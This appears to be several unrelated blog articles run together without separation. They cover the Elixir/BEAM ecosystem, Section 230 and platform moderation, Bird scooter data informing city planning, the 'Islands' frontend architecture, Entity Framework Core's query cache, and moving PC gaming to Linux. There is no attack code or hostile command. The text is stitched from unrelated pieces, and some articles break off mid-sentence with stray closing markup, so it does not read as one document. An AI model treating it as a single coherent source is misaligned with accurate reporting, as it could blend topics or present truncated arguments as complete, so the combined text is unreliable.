<p>With OTP 24 landing sometime next year we are going to get the a JIT for the BEAM. Based on the project <a href="https://github.com/asmjit/asmjit">AsmJit</a> this will mean that some BEAM code will be translated to native instructions. It will not be the kind of warm-up-for-performance-gains JIT that I’ve heard of in PyPy but rather significantly simpler. The goal of the project was to introduce a JIT that could give performance gains for some cases but would not cause any performance regressions. A pragmatic and laudable approach. Considering this made the Jason JSON-library (written in Elixir) beat the Jiffy JSON-library (written as a C NIF) in <strong>some</strong> tests I think this has the potential to obviate the need for some NIF implementations. Avoiding reaching out to the lower level code that is more capable but more dangerous is a good win.</p>
<p>Anyone running RabbitMQ should look forward to the update as measurements indicate 30-50% increased message throughput. Which is a nice thing to get for no code changes at all.</p>
<p>Pushing the performance of the BEAM closer to native is magnificent. To be clear the BEAM is already quite a good performer. I would put Erlang and Elixir at the abstraction level of languages like Python/Ruby/Node.js. Python and Ruby are poor performers. The Python ML stuff all goes into C++ or similar for performance. I’ve worked a bunch with Python and the things I hear from the Ruby world makes them sound quite equivalent in performance. They are a bit slow and can only <a href="https://underjord.io/more-than-one-thing-at-a-time.html">do one thing at a time</a>. Node.js is a bit different. It can do multiple things at a time, if you append asterisks and squint. It does it largely the same way Python + Gevent does it. This approach is incredibly susceptible to CPU-bound work causing head-of-line blocking. It becomes the single most important consideration for building a performant application “get to IO, don’t compute”. V8 that Node.js runs on is heavily optimized and fast for such a dynamic language. I think the BEAM provides a better approach that can deliver comparable results without as many footguns (opportunities for shooting yourself in the foot). But getting better at the raw crunching is a big gain with this JIT implementation and I look forward to the release.</p>
<h2 id="lumen---static-compilation--wasm">Lumen - Static compilation &amp; WASM</h2>
<p>The <a href="https://getlumen.org/">Lumen project</a> is a huge effort by a gang of open source developers and DockYard to implement a compiler (and more) that can take Elixir and Erlang into the browser. By solving that they end up solving static compilation for Erlang and Elixir as well. So this isn’t compiling and shipping the BEAM to the browser. This is a faithful reimplementation of the BEAM functionality in a way that allows it to be compiled statically. It uses LLVM and requires quite a bit of effort both in development and in wrangling the Web Assembly work group process stuff to make sure that the standard is not entirely run by Object-Oriented Programming needs.</p>
<p>I don’t think Lumen will replace the BEAM. The BEAM has a brilliant track record for long-running services and distributed computing that the Lumen project do not even attempt to achieve right now. Instead the Lumen project will allow Elixir and Erlang to move into spaces where the BEAM might be a bit too heavy and still provide the same guarantees. Typically I see it being good for command line tools, web frontends (super interesting to consider the Actor model going there), serverless/edge computing and potentially with WASM competing with Docker as a delivery mechanism for code in Kubernetes, using something like <a href="https://github.com/deislabs/krustlet">Krustlet</a> (<a href="https://player.fm/series/software-sessions/webassembly-on-the-server-with-krustlet">good podcast episode on WASM/Krustlet</a>). It’s probably Cloud Native or something. Who knows.</p>
<p>What gives Lumen the potential to be a better fit in these circumstances is that it can optimize for filesize (by cutting out hot code updates) and it is likely able to start much faster. Lumen is written in Rust. Which seems to be the popular choice around Web Assembly from what I’ve seen. Lumen is still an early release project and not fit for production. But it is beeing actively pushed forward.</p>
<h2 id="nerves---an-iot-platform-with-minimal-suck">Nerves - An IoT platform with minimal suck</h2>
<p>The <a href="https://www.nerves-project.org/">Nerves project</a> is fantastic. I’m a hardware hobbyist, not an IoT dev but I’ve worked a fair bit with Nerves and it is so, so good. What Nerves gives you when working with a Raspberry Pi for example is a way to let your code run all of the device. The BEAM is basically your operating system on top of a minimal Linux installation. The Linux you have is based on the solid foundation of Buildroot so it is quite feasible to modify it as you see fit. The big idea is that if you are running a Linux-level SBC already you might as well build on something that gives you the guarantees of the BEAM.</p>
<p>Beyond that the default setup encodes a lot of good embedded practices by default so that you avoid bricking devices with firmware updates, you get easy support for pushing firmware over the network or USB and much, much more.</p>
<p>There are a ton of good libraries for sensors and assorted hardware, as well as the common protocols like GPIO/SPI/I2C/UART. Networking support is well considered and has been reworked since I first started using Nerves a few years back (and it worked well then too). BLE is getting more and more good support recently.</p>
<p>The project also created <a href="https://www.nerves-project.org/nerveshub">NervesHub</a> which is a solution for managing a fleet of devices by securely providing firmware updates, allowing the switching on of a remote console on devices if that’s a need on your product. I think the most recent stuff is a UI revamp and some serious work on binary diffed patches to minimize firmware update sizes for data-constrained deployments.</p>
<p>This is very much a production project and people are shipping hardware with Nerves. It keeps marching forward.</p>
<h2 id="the-beam-can-be-your-entire-application">The BEAM can be your entire application</h2>
<p>Saša Jurić, author of the much-acclaimed Elixir in Action book has produced a library called <a href="https://github.com/sasa1977/site_encrypt">site_encrypt</a>. It allows you to handle LetsEncrypt configuration without a separate webserver or actually using certbot.</p>
<p>Now this library is good and meaningful in its own right but the underlying idea is why I bring it up. The BEAM can be your entire application. This is something I’ve realized over time. Where in Python you would reach for Gunicorn to run you Django app and Nginx to protect Gunicorn from the big bad world.. The BEAM is made for this. Introducing an intermediate layer of Nginx (or another HTTP server) might actually be detrimental in that you now have two things you need to configure correctly and two pools of multi-core processing workers that care about this request/response cycle and can independently screw it up.</p>
<p>The BEAM was always built for this. OTP has a lot weird corners where you find interesting libraries such as <code>wx</code> for WxWidgets (window management) and <code>ssh</code> for both SSH client and server work I believe. Because it is meant to be delivered as a full solution. It can run and manage multiple different types of work inside of it. Gracefully. It doesn’t replace Kubernetes for the large deployment or polyglot environments. But it might very well mean you don’t actually need to go there early. Or you can reduce how much Ops you need in your Dev. If your entire stack is Elixir or Erlang front to back I think you have empowered your developers significantly.</p>
<p>There is already a move towards this where tools are converging that give us a lot of things out of the box that we’d otherwise need to move outside our application for. These are pragmatic 80-90% solutions. The normal solutions are still all there if you need to reach for them. But maybe you don’t. I see these as moves in the same vein:</p>
<ul>
<li>LiveView - We can reduce the amount of frontend we need to build that isn’t BEAM code (Elixir or Erlang), in some cases get rid of it entirely.</li>
<li>Live Dashboard - Application insights right in your application stack instead of pushing them out to another solution.</li>
<li>Phoenix PubSub - Distributed PubSub without requiring coordination via something like Redis.</li>
<li>Phoenix Channels - Distributed PubSub over WebSockets using the above PubSub to coordinate delivery.</li>
<li>Phoenix Presence - Distribute Presence. A CRDT-powered thing for maintaining information about if someone is connected to a channel or not, like chatrooms and online/offline. Using Channels.</li>
</ul>
<p>Lowering complexity by keeping the solutions in a system you understand well is potentially very powerful. At some point many projects will need to pick up external dependencies such as Nginx, Redis or whatever. But I think there is something compelling about building your application inside a system that can do all of it quite well. Elixir and Phoenix already have significant mind-share in the startup world. I wouldn’t be surprised if this ends up being a very popular solution for startups. No frontend-specific code for the MVP, no New Relic or Mixpanel bill we make do with the Live Dashboard. Distribution is Erlang distribution + Swarm/Horde/Libcluster or something …</p></article></div>

  <p>Everyone's angry at the tech industry these days! Tech companies continue to cement their place as some of the most powerful companies in the world, and taking shots at them has become a popular sport. Most recently, <a href="https://www.npr.org/2020/10/14/923766097/facebook-and-twitter-limit-sharing-new-york-post-story-about-joe-biden">Facebook and Twitter suppressed a controversial New York Post article</a>, raising accusations that the social networks are putting their thumbs on the scale of the upcoming election.</p>
<p>In response, conservatives — <a href="https://twitter.com/realDonaldTrump/status/1316821530769149952?s=20">led by the President</a> — have set their sights on Section 230, the <a href="https://www.eff.org/issues/cda230">legislation that protects the right of Internet companies to moderate content</a>. “Repeal Section 230” has become a popular rallying cry from people who believe that large social networks are abusing this ability to enact a political agenda. There’s a lot of rhetoric around “publishers” and “platforms” (the idea being that if you decide to moderate content on your app or website, you should assume legal liability for it) and that Internet companies are breaking the rules by deciding what content to allow.</p>
<p>Naturally, the left disputes the claim that conservatives are being censored. But we can still analyze the power of gatekeeper platforms even if we disagree about how they're wielding it.</p>
<!--more-->
<p>As we'll see, the law as it exists today expressly permits the moderation in which tech companies engage. More to the point, the platform/publisher dichotomy is rooted in constraints of traditional media that don't apply to the Internet.</p>
<p>Those constraints — or the lack thereof — should guide our efforts to make the Internet a more equitable place. The web in particular was built with the promise of giving everyone a voice; it's only in the last decade or so that power became truly centralized. We keep that promise not by forcing gatekeepers to play fair, but by getting rid of them entirely.</p>
<hr>
<p>In the analog era, the act of publishing was subject to physical constraints. A newspaper, for example, printed a set number of pages a few times daily. If they wanted to publish content by third parties, they had to read it all and make an editorial decision about what made the cut. As a result, publishers were responsible for vetting everything that ran under their masthead.</p>
<p>By contrast, it was unreasonable to expect a news stand to check every word in every newspaper they sold every day. These entities were called “distributors”. If an article in a newspaper turned out to be libelous, only the publisher was on the hook legally, while the distributor enjoyed legal immunity.</p>
<p>The Internet turned this model on its head. Space to publish became infinite, time to publish became instant and distributors became unnecessary. Websites could host discussions between thousands of people in real time, and checking every single comment was infeasible. That then raised the question: who was liable for the comments?</p>
<p>Two lawsuits that are often cited as catalysts for Section 230 are <a href="https://en.wikipedia.org/wiki/Cubby,_Inc._v._CompuServe_Inc"><em>Cubby, Inc. v. CompuServe, Inc.</em></a> and <a href="https://en.wikipedia.org/wiki/Stratton_Oakmont,_Inc._v._Prodigy_Services_Co"><em>Stratton Oakmont, Inc. v. Prodigy Services Co.</em></a> <sup><a href="#1">1</a></sup> — both defamation cases against Internet service providers. In the former case, the court ruled that because CompuServe didn’t review any of the content on its forums, it was acting as a distributor and therefore not liable for defamatory content. In the latter case, the court ruled the opposite: because Prodigy moderated users’ comments, it was acting as a publisher.</p>
<p>To resolve this ambiguity, Congress added Section 230 to the Communications Decency Act, which it passed in 1996. The <a href="https://www.law.cornell.edu/uscode/text/47/230">portion most people are talking about</a> is printed below:</p>
<blockquote>
<p><strong>(1) Treatment of publisher or speaker</strong> No provider or user of an interactive computer service shall be treated as the publisher or speaker of any information provided by another information content provider.</p>
<p><strong>(2) Civil liability</strong> No provider or user of an interactive computer service shall be held liable on account of—</p>
<p><strong>(A)</strong> any action voluntarily taken in good faith to restrict access to or availability of material that the provider or user considers to be obscene, lewd, lascivious, filthy, excessively violent, harassing, or otherwise objectionable, whether or not such material is constitutionally protected; or</p>
<p><strong>(B)</strong> any action taken to enable or make available to information content providers or others the technical means to restrict access to material described in paragraph (1).</p>
</blockquote>
<p>Both the letter and the spirit of the law are intended to allow Internet services to moderate third-party content however they wish, while shielding them from legal liability if it turns out to be defamatory. Legally, the “publisher vs. platform” dichotomy does not exist.<sup><a href="#2">2</a></sup></p>
<hr>
<p>The logic behind the repeal of Section 230 seems to be that doing so would force platforms like Twitter to not moderate content. This isn’t strictly true; surely everyone, no matter where they sit on the political spectrum, can think of a biased publisher or two! Twitter would still be free to censor conservative content. The difference is that they would then be liable for any unrelated content they allowed that happened to be defamatory.</p>
<p>A more nuanced read is that the threat of litigation would essentially be a stick that would prevent platforms from moderating. Users couldn’t sue Twitter for removing content — but Twitter would choose not to anyway, for fear of getting sued by someone with deep pockets if they accidentally let a defamatory tweet go viral.</p>
<p>There's no way to know exactly what would happen if 230 were repealed, but here’s a guess at how things might shake out.</p>
<p>At first, a lot of platforms might stop moderating. This would seem like a win for Team Repeal, until they realized what moderation keeps at bay. Blatant racism, doxxing and threats of violence would be commonplace. Spam filtering is a form of moderation, so discussions would be filled with links to porn sites and scams. Actual conversations would get drowned out.</p>
<p>That would be a deal breaker for a lot of people, who would stop using those platforms. It's possible things would end here, and those who could be more thick-skinned would just deal with the death threats and spam. On the other hand, since there's no actual legislation indemnifying platforms if they <strong>don't</strong> moderate — just a shaky legal precedent resting on some decades–old cases — it's possible that we'd start seeing lawsuits anyway.</p>
<p>In response to the legal risk and decaying user bases, companies would start <strong>heavily</strong> moderating — spending a lot of money to make sure they only allow content that doesn’t risk a lawsuit. This might function similarly to the New York Times comment section, where comments are screened before being published. Most of the content people say is being censored now (like the story in the New York Post, which was <a href="https://www.nytimes.com/2020/10/18/business/media/new-york-post-hunter-biden.html">explicitly chosen as a publisher because it wouldn't vet the story</a>) would probably end up on the cutting room floor — it might give someone grounds to sue, so better to just err on the side of caution.</p>
<p>Smaller platforms wouldn’t have the resources to do this. They’d end up either limping on with severely compromised experiences or just going out of business. There would be a steep drop in the number of platforms created, since the spam issue would be especially overwhelming for those in their infancy.</p>
<p>Independent websites would suffer even more. Let's say I added a comments section to this blog, and then one day I started getting flooded with spam. I'd face a dilemma: delete the spam and risk a lawsuit, or let it continue to suffocate the conversation? (Assuming that allowing a free-for-all would indemnify me, which, again, is not guaranteed). I'm not even making any money from this website — is it worth the legal risk?</p>
<p>Meanwhile, some crucial web infrastructure simply could not exist without incurring liability. Ranking, for example, is a fundamentally biased act that depends on inferences about both the intent of the reader and the nature of the content being ranked.<sup><a href="#3">3</a></sup> Search engines would be the most obvious casualty, as every search result would present a legal liability. Requiring humans to check each of the <a href="https://www.weforum.org/agenda/2019/09/chart-of-the-day-how-many-websites-are-there/">1.7 billion websites</a> would result in far less of the web being searchable. The added difficulty and expense would further entrench Google's search monopoly, which is already <a href="https://www.wsj.com/articles/justice-department-to-file-long-awaited-antitrust-suit-against-google-11603195203">the target of a Justice Department antitrust lawsuit</a>.</p>
<p>Whatever the case, the end result would be a chilling effect at all levels of Internet discourse. Most platforms would be far more censorious than they are today, and the rest would be overrun by trolls and spammers. Small platforms would go under — and worse, far fewer would be created in the first place. Interaction on personal websites would almost entirely disappear. Many people would feel intimidated by abuse and threats and withdraw from their public presence online. Others would just get fed up with the spam.</p>
<hr>
<p>A common response to these scenarios is that platforms should have to be neutral with regard to <strong>ideology</strong>, but still be free to filter <strong>spam</strong>.</p>
<p>Okay, so what counts as spam? Some is obvious "I made $1,000 from my couch" type stuff. But the majority falls in a gray area that would create huge headaches for platforms trying to comply with the law and courts trying to enforce it.</p>
<p>Most people who have been online have seen messages for erectile dysfunction drugs or porn sites. But how do you disambiguate between that and online sex workers promoting themselves? What’s the fundamental difference between a sketchy online pharmacy and <a href="https://www.getroman.com/">Roman</a>?<sup><a href="#4">4</a></sup></p>
<p>If you think those examples are a bit contrived, it’s easy to come up with an example where it’s not only ambiguous whether something is spam, but also unclear whether blocking it would be political censorship.</p>
<p>Say I run a pro-Trump forum on which I occasionally encourage people to buy Trump campaign merch. One day, someone shows up and starts posting links to Biden merch. Is that spam, or political discourse? I can’t very well say advertising campaign merch is prohibited, since I do it myself. Could I ban all promotion of campaign merch? What if they’re not …</p></article></div></div>

<p>There’s a lot we can learn from hundreds of millions of micromobility trips.&nbsp;</p>



<p>Over the past three years, that fact has become increasingly evident—and increasingly important. Electric scooters have carried tens of millions of riders across hundreds of cities around the world. When combined, these unique trips tell the story of human-sized urban mobility at a macro scale. What streets are the most convenient to travel on two wheels? What times of day are best suited for riding? Where do we tend to park when given the opportunity?</p>



<p>Cities that are listening closely to this story find themselves in a position to do something incredible: make low-cost, high-impact improvements to urban infrastructure based on the real time needs of their inhabitants. It’s the first time in history that such precise, data-backed decision making has been possible for city planning purposes.&nbsp;</p>



<p>As one of the founding members of the <a href="https://www.openmobilityfoundation.org/" target="_blank" rel="noreferrer noopener"><span>Open Mobility Foundation</span></a>, Bird is proud to have committed to responsible data sharing principles since pioneering shared e-scooters in 2017. To us, the data we learn from is just as important as the vehicles we build, because that’s what allows cities to make critical infrastructure and transit improvements for the benefit of all road users.&nbsp;</p>



<p>When it comes to turning such information into action, these three cities are doing a particularly good job.</p>



<h3>Atlanta, Georgia, USA</h3>



<p><br>When Bird scooters first arrived in Atlanta, the city had just 4 miles of protected bike lanes. This quickly proved insufficient to safely accommodate the increasing number of micromobility riders, and Mayor Keisha Lance Bottoms’ administration took action.&nbsp;</p>



<p>By September of 2019, not only had a <a href="https://atlanta.curbed.com/2019/9/25/20882978/mayor-keisha-lance-bottoms-protected-bike-lanes" target="_blank" rel="noreferrer noopener"><span>$5 million action plan</span></a> been unveiled to add an additional 12 miles of protected Light Individual Transport lanes by 2021, but Mayor Bottoms was already implementing and testing temporary protected infrastructure along the city’s busy 10th Street corridor. The resulting data, shared earlier this year, demonstrate two crucial, correlated points:&nbsp;</p>



<ul><li>87% of cyclists and 83% of scooter riders said they felt safer during the popup, leading to a</li><li>58% increase in bike and scooter rides during the popup&nbsp;</li></ul>



<p><br>“We have heard from residents of Atlanta loud and clear – people want safer streets, and they want to see real changes,” the Mayor <a href="https://www.ajc.com/news/local-govt--politics/atlanta-mayor-bottoms-promises-triple-city-bike-scooter-lanes/zl0kpszowj2E7z7SXLM1mJ/" target="_blank" rel="noreferrer noopener"><span>said in a statement</span></a>.<br></p>

<h3><br>Tel Aviv, Israel</h3>



<p><br>Last year, Tel Aviv was ranked <a href="https://www.haaretz.com/israel-news/business/.premium-tel-aviv-ranked-5th-worst-in-world-for-traffic-congestion-1.8069979" target="_blank" rel="noreferrer noopener"><span>5th worst in the world</span></a> for traffic congestion. This year, the city is <a href="https://www.bird.co/blog/reversing-pyramid-tel-aviv-goes-all-in-pedestrians-micromobility/" target="_blank" rel="noreferrer noopener"><span>reversing that trend</span></a> by launching an ambitious initiative that will add 160 km of new micromobility infrastructure by 2025.</p>



<p>The coastal Israeli city has become a global leader in e-scooter adoption. Earlier this year, we announced that riders in Tel Aviv had <a href="https://www.bird.co/blog/tel-aviv-modeshift-milestone-5-million-bird-rides-2-years/" target="_blank" rel="noreferrer noopener"><span>surpassed 5 million trips on Bird alone</span></a>. The data collected from these rides has been instrumental in helping city officials plan for infrastructure improvements:&nbsp;</p>



<p>“Thanks to the support from and data shared by micromobility operators like Bird, we’ve been able to identify where new infrastructure is most needed in order to encourage modeshift and reduce our dependence on private cars,” said Deputy Mayor Meital Lehavi.&nbsp;</p>



<p>The city plans to use its new infrastructure to coax drivers out of their cars, increasing the amount of micromobility commuters from 11% to 25% over the next 5 years.&nbsp;<br></p>

<h3><br>Santa Monica, California, USA</h3>



<p><br>The beachside city of Santa Monica in Los Angeles County passed a Bike Action Plan in 2011 that was one of the first of its kind in the country. It created <a href="https://www.smdp.com/letter-to-the-editor-in-support-of-santa-monicas-proposed-bike-action-plan-amendment/197427" target="_blank" rel="noreferrer noopener"><span>hundreds of miles</span></a> of bike lanes and bike friendly corridors, reinforcing the city’s commitment to safer streets and cleaner air.&nbsp;</p>



<p>In 2020, city officials decided to amend that plan in order to once again take a leading role nationwide in micromobility infrastructure—this time by focusing on protected bike and scooter lanes. By analyzing scooter data from millions of trips along with information on car congestion and accidents, those drafting the amendment were able to lay out an additional 19 miles of separated micromobility infrastructure and amenities that will increase bike and scooter use and decrease reliance on personal cars and ride hailing.</p>



<p>The amendment reflects Santa Monica’s ambitious goal of reducing carbon emissions <a href="https://www.smartcitiesdive.com/news/santa-monica-ca-passes-800m-plan-to-go-carbon-neutral-by-2050/555693/#:~:text=The%20Climate%20Action%20%26%20Adaptation%20Plan,%2C%20bike%2C%20scooter%20or%20skateboard." target="_blank" rel="noreferrer noopener"><span>80% below 1990 levels</span></a> by 2030. A survey conducted last year reported that nearly 50% of micromobility riders used either a shared bike or scooter to <a href="https://www.smgov.net/uploadedFiles/Departments/PCD/Transportation/SharedMobilityUserSurveyReports_Combined.pdf" target="_blank" rel="noreferrer noopener"><span>replace a car</span></a> during their most recent trip. That’s an impressive accomplishment by any measure.</p>



<p>Councilmembers <a href="https://www.smdp.com/city-amends-bike-action-plan-to-include-more-safety-lanes/197572" target="_blank" rel="noreferrer noopener"><span>voted unanimously</span></a> to pass the Bike Action Plan Amendment earlier this month.<br></p>

        <section>
            <p><img src="https://res.cloudinary.com/wedding-website/image/upload/c_scale,w_2400/v1597095361/krzysztof-grech-6orUY98fw9s-unsplash_r6wjnf.jpg"></p>



<p>I’ve struggled to find references to this online, but heard the name used multiple times this year when describing the approach outlined here.</p>

<p>The general idea of an “Islands” architecture is deceptively simple: render HTML pages on the server, and inject placeholders or slots around highly dynamic regions. These placeholders/slots contain the server-rendered HTML output from their corresponding widget. They denote regions that can then be "hydrated" on the client into small self-contained widgets, reusing their server-rendered initial HTML.</p>

<p>You can think of this like a static HTML document that contains multiple separate embedded applications:</p>

<p>  
<img width="600" src="https://res.cloudinary.com/wedding-website/image/upload/v1596766231/islands-architecture-1.png">  
</p>

<p>This may seem similar to "micro-frontends" at first glance. Both approaches share the idea of breaking applications up into independent units, however "micro-frontends" do not typically imply that composition of those units is achieved using HTML.</p>

<p>A closer analog to the "islands" approach would be progressive enhancement, to which we're essentially adding SSR hydration and a consistent metaphor for adding interactivity to a region of the page. In traditional progressive enhancement, we might have a <code>&lt;script&gt;</code> that looks for an image carousel in the page and instantiates a jQuery plugin on it. Instead, that image carousel would be rendered on the server and a dedicated <code>&lt;script&gt;</code> emitted for it that loads the image carousel implementation and in-place upgrades it to be interactive.</p>

<h3 id="whydoesthismatter">Why does this matter?</h3>

<p>As it turns out, there are a number of benefits to the group of approaches described here when compared to typical Single Page Application architectures.</p>

<h5 id="progressivehydrationforfree">"Progressive Hydration" for free</h5>

<p>I’ve touted the performance benefits of <a href="https://www.youtube.com/watch?v=k-A2VfuUROg">Progressive Hydration</a> techniques for frameworks like React, Angular, Preact and Vue. With these architectures, individual widgets on a page are loaded and initialized over time. This can be done using a simple scheduling approach via requestIdleCallback, or can take additional factors into account like viewport visibility, interaction likelihood, product value, etc.</p>

<p>Similar to Progressive Hydration, rendering pages using an islands architecture results in the heavier dynamic portions of the page being initialized not just progressively, but <em>separately</em>. This means individual regions of the page become interactive without anything else on the page needing to be loaded first.</p>

<p>Unlike Progressive Hydration, the approaches that fall out of building around an islands architecture do not require top-down rendering. This is a distinct advantage, since there are no outer “root” components that must be initialized before their descendants. Each part of the page is an isolated unit, and a performance issue in one unit doesn't affect the others.</p>

<h5 id="seoanduxarentatradeoff">SEO and UX aren’t a tradeoff</h5>

<p>The status quo for SSR as used by Single Page Applications is that it’s often cited as a necessity for SEO reasons. However, SSR can actually have a net <em>negative</em> impact on User Experience - visitors are left waiting for the actual functionality of a page to arrive while staring at a frustratingly fake version of that page.</p>

<p>Many applications also suffer from silent SSR performance pitfalls without realizing it. In virtual DOM libraries, it's easy (and common) to accidentally construct a situation where first render destroys the server-rendered HTML DOM, only to recreate it again from scratch (often synchronously). This is the result of some common misconceptions, which may stem from documentation giving an idealized view of hydration while passing over tricky caveats and footguns.</p>

<p>Even in cases where SSR hydration is functioning as designed, the status quo leaves a lot to be desired. The amount of JavaScript work being performed during page load is still many orders of magnitude more than what might be considered "efficient".</p>

</figure>

<p>In an "islands" model, server rendering is not a bolt-on optimization aimed at improving SEO or UX. Instead, it is a fundamental part of how pages are delivered to the browser. The HTML returned in response to navigation contains a meaningful and immediately renderable representation of the content the user requested.</p>

<p>Sections of that HTML may be missing their client-side interactivity, but the document should at least contain the most essential content. For example: a news page’s HTML would contain the article body, and a product page would contain that product’s description.</p>

<p>All of the other content is secondary to this information, and its inclusion in the HTML becomes a product decision. How vital is this bit of information to a user visiting the page? How important is that widget to the business model? A "buy now" button that directly relates to revenue should be easily prioritized over a site feedback survey button that relates to information gathering.</p>

<h5 id="betterforaccessibilityanddiscoverability">Better for accessibility and discoverability</h5>

<p>A website that uses standard HTML links for navigation is easier for assistive technologies and web crawlers to use. This is true regardless of whether links or forms are intercepted by JavaScript and rerouted to client-side logic, because the underlying assumptions remain true: clicking a link navigates to the given page.</p>

<p>Anecdotally, think of the number of times you’ve been sent a “link” to what the sender assumed was the page they were viewing, only to realize the link contained none of the necessary information:</p>

<p>  
<img width="350" src="https://res.cloudinary.com/wedding-website/image/upload/v1596766231/islands-architecture-3.png">  
</p>

<p>Building page-based applications doesn't completely prevent these types of strange experiences, it only makes the decision to do so more direct. It makes the default outcome the accessible one.</p>

<hr>

<p>When it comes down to it, shipping an architecture that requires less code to do something is the type of long-term benefit your future self (or coworkers) will thank you for. It's possible — likely, even — that adopting a model like this requires more up-front design thinking. There are far few batteries-included options available for decomposing apps into independently deliverable widgets. Who knows, maybe we can fix that.</p>

</p>
<p>Last week, when <a href="https://www.tabsoverspaces.com/233837-net-developerdays-2020">speaking at .NET Developer Days</a>, I got a question about the query cache in Entity Framework Core – is it shared across <code>DbContext</code>s or is it per instance? With this question I realized I know how the cache work(ed) in Entity Framework 6, but I’m not entirely sure how it’s done in Entity Framework Core. Time to explore! And you can go with me.</p>
<!-- excerpt -->
<p>Let’s do some basic thinking first. Does it make sense to have query cache across instances? For the same <code>DbContext</code> type and hence same model (<code>IModel</code>) for sure. Could it be useful for different <code>DbContext</code>s? Maybe. Probably not. Although you can have, i.e. when using <em>bounded contexts</em>, <code>DbContext</code>s with overlap, the query would have to use only the overlapping part of the model and the cache would have to be able to work on fine granularity.</p>
<p>I’ll try to figure out the result only searching file names, types, content and reading pieces of code. Here we go.</p>
<p>The query cache should be in some file containing <em>query</em> and <em>cache</em> in its name, right? Luckily there’s a <code>CompiledQueryCache.cs</code>. Nice, there’s a <code>IMemoryCache</code> being used and the description states it is a <em>singleton</em>. And the <code>GetOrAddQuery</code> method already has the <em>key</em> as an input argument. This comes from <code>QueryCompiler</code> class and <code>ICompiledQueryCacheKeyGenerator.GenerateCacheKey</code> is used. The <code>CompiledQueryCacheKeyGenerator</code> is the implementation of that interface and it just returns instance of <code>CompiledQueryCacheKey</code>, which is defined as <code>protected readonly struct CompiledQueryCacheKey : IEquatable&lt;CompiledQueryCacheKey&gt;</code>. Cool. The equality is implemented as follows.</p>
<pre><code>public bool Equals(CompiledQueryCacheKey other)
{
    return ReferenceEquals(_model, other._model)
        &amp;&amp; _queryTrackingBehavior == other._queryTrackingBehavior
        &amp;&amp; _async == other._async
        &amp;&amp; ExpressionEqualityComparer.Instance.Equals(_query, other._query);
}

public override int GetHashCode()
{
    var hash = new HashCode();
    hash.Add(_query, ExpressionEqualityComparer.Instance);
    hash.Add(_model);
    hash.Add(_queryTrackingBehavior);
    hash.Add(_async);
    return hash.ToHashCode();
}
</code></pre>
<p>OK, so it’s checking the selected <a href="https://docs.microsoft.com/en-us/ef/core/querying/tracking"><em>tracking</em> behavior</a>, whether it’s <em>async</em> and finally the model plus query. The <code>ExpressionEqualityComparer</code> and specifically the <code>ExpressionComparer</code> seems to be checking whether the “structure” of the query is the same. Makes sense, the <em>canonical</em> version of the query is very likely done in another place. That leaves us only with <code>ReferenceEquals(_model, other._model)</code>.</p>
<p>Clearly this is comparing references, hence the question is whether the model (<code>IModel</code>) is somewhat cached between instances too. Again, probably the file is gonna have <em>model</em> and <em>cache</em> in its name. And there seems to be <code>IModelCacheKeyFactory</code> where the implementation <code>ModelCacheKeyFactory</code> is using just <code>ModelCacheKey</code>. And this class has a nice comment.</p>
<pre><code>///         A key that uniquely identifies the model for a given context. This is used to store and lookup
///         a cached model for a given context. This default implementation uses the context type as they key, thus
///         assuming that all contexts of a given type have the same model.
</code></pre>
<p>So, the <code>Type</code> of <code>DbContext</code> is used for equality comparisons.</p>
<p>And here you have it. When everything is put together, we can infer the query cache is using <code>IMemoryCache</code> as an implementation, it’s a <em>singleton</em> (aka shared across everything in Entity Framework Core) and caching key ultimately depends on the model, which is the same across same <code>DbContext</code>s.</p>

		<p>For the past 15 years I’ve been a very opinionated PC gamer, along with the rest of my family. However it’s always been a pain in some shape or form to <em>be</em> a PC gamer, be it with the constant software updates, the lack of first-party support, or just the general cost. I’m one of these people that has stuck to good old Windows 7 because a mobile UI on my gaming PC is what I imagine hell to be. I’ve had no problems thus far, but there are more and more 10-only games coming out by the day, and some of them are enticing an upgrade.</p>
<p>Fortunately, there has been a LOT of activity around Wine and Vulkan to get Windows games running on Linux, to the point where I scheduled some time this Christmas break to give it a shot. My goal was to run the few games I actually wanted to play (Elite Dangerous, Minecraft, Subnautica, Garry’s Mod) on Linux on a spare computer before the 25th, whilst also proving to my family of gamers that it was time to “break the glass” and get away from the proprietary OS.</p>
<h2 id="by-the-way-i-tried-to-use-arch">By the way I tried to use Arch</h2>

<p><a href="https://m1cr0man.com/posts/gaming-on-linux/images/2018-12-24-003401_1440x900_scrot.jpg"><img src="https://m1cr0man.com/posts/gaming-on-linux/images/2018-12-24-003401_1440x900_scrot_hue660b04f3b99512430f28cfa69e907e7_222930_0x384_resize_q85_gaussian.jpg" title="Desktop"></a></p><p>I don’t think it’s possible to ever finish installing Arch, you just get more things configured (and broken) over time. I started this week trying to set up a system with Steam installed and Linux compatible games running. It took a full day’s work to get through the numerous issues I encountered, but I eventually had Garry’s Mod launching, albeit with some weird error about <code>en_US.UTF8</code> not being available.</p>
<p>At that point, I wasn’t at all happy with the setup. I had a very minimal i3, a very broken version of Steam with all sorts of rendering issues, and one native Linux game limping along. I installed LXDE so that I had a window manager that cooperated with the concept of full screen graphics applications, but even with my high tolerance for outdated looking UIs I still couldn’t help but dislike the default theme. I spent a good few hours fixing that but it was still uncomfortable to use.</p>
<p>I tried setting up <a href="https://lutris.net/">Lutris</a> too. They recommend installing wine-staging which is no problem on Arch because you just grab the <a href="https://aur.archlinux.org/packages/wine-staging-git/">wine-staging AUR package</a> and job done. However I still couldn’t get it to launch any games due to all sorts of missing dependencies in Wine (and maybe due to my Donegal internet too).</p>
<p>When I realized I needed to install most 32 bit versions for everything I accepted defeat. It was going to be too much hassle to configure + maintain an Arch gaming install, and I’d never want to reload that machine. I took a night to think about it, then I broke up with Arch in the morning.</p>
<h2 id="solus-is-new-bae">Solus is new bae</h2>
<p>Whilst I was browsing around on Lutris, Reddit, and some other sites I kept seeing mentions of this new Debian based distro with some real fancy window manager. With my lack of motivation to do configuration myself my requirements were now very different as to when I picked Arch. However, with the need for a very new version of Steam + Wine in order to play games I needed something that had either frequent updates or a way to easily update manually.</p>
<p>The Solus website looked very appealing. “Designed for Home Computing”. Last time I read that I set up Mint on my granny’s laptop, and I don’t think she used it since. However something about the material design of its site and UI made me think it was at least worth a shot.</p>
<p>I downloaded the ISO, booted up a computer, and in about 10 minutes I had a running machine. This PC does have an SSD in it, but even so it took just 4 seconds to boot to the login screen! My mentality of it needing to be Arch to boot fast went right out the window.</p>
